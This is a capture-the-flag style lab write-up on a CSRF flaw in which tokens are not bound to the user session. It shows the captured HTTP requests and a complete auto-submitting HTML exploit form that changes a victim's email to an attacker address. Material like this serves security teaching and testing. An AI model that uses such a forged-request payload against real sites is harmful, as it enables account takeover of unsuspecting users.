
---

# 🧪 Lab: CSRF Where Token Is Not Tied to User Session

## 🎯 Objective

Exploit a CSRF vulnerability to change another user’s email address using a token obtained from your own account.

---

## 🛠️ Approach (Manual — No Burp Suite Professional)

---

## 🔍 Step 1: Identify the Behavior

* The application includes a **CSRF token** in the email change request.
* Initial assumption: token should be tied to user session.

👉 Hypothesis:
Token may **not be session-specific**.

---

## 🔑 Step 2: Obtain a Valid CSRF Token

1. Log in as:

   ```
   wiener:peter
   ```
2. Navigate to **My Account → Update Email**
3. Open browser **DevTools (F12 → Network)**
4. Submit the form

Captured request:

```
POST /my-account/change-email HTTP/2
Host: target

email=test@test.com&csrf=TOKEN_1
```

👉 Extracted CSRF token: `TOKEN_1`

---

## 🧪 Step 3: Test Token Reuse Across Sessions

1. Open **incognito/private window**
2. Log in as:

   ```
   carlos:montoya
   ```
3. Capture email change request
4. Replace victim’s token with `TOKEN_1`

Modified request:

```
POST /my-account/change-email HTTP/2
Host: target

email=hacked@evil.com&csrf=TOKEN_1
```

✅ Request accepted
✅ Email updated successfully

---

## 💡 Vulnerability Confirmed

* CSRF token is **valid across different user sessions** ❌
* Token is **not bound to session or user identity** ❌

👉 This makes CSRF protection ineffective

---

## ⚠️ Important Observation

* Tokens are **single-use**
* A fresh token must be obtained before launching the attack

---

## 💣 Step 4: Craft CSRF Exploit

Using a valid token from attacker account:

```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body onload="document.forms[0].submit()">
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="pwned@attacker.net" />
        <input type="hidden" name="csrf" value="VALID_TOKEN_HERE" />
    </form>
</body>
</html>
```

---

## 🚀 Step 5: Deliver the Exploit

1. Paste HTML into **Exploit Server**
2. Click **Store**
3. Click **Deliver to victim**

---

## ✅ Result

* Victim’s browser sends:

  * Their session cookie ✅
  * Attacker’s CSRF token ✅

* Server accepts request

* Email is changed

✔️ Lab solved

---

# 🧠 Key Learning

| Issue             | Explanation                   |
| ----------------- | ----------------------------- |
| Token exists      | Gives false sense of security |
| Not session-bound | Can be reused across users    |
| Single-use        | Requires fresh token          |
| Impact            | Full CSRF bypass              |

---

# 🏁 Final Professional Writeup

> The application implements CSRF tokens but fails to bind them to user sessions. A token obtained from one account can be reused to perform actions on another account. By capturing a valid token from the attacker’s account and embedding it into a crafted HTML form, a CSRF attack was executed successfully. When the victim accessed the malicious page, their browser submitted a request containing their session cookie and the attacker’s token, resulting in unauthorized email modification.

---
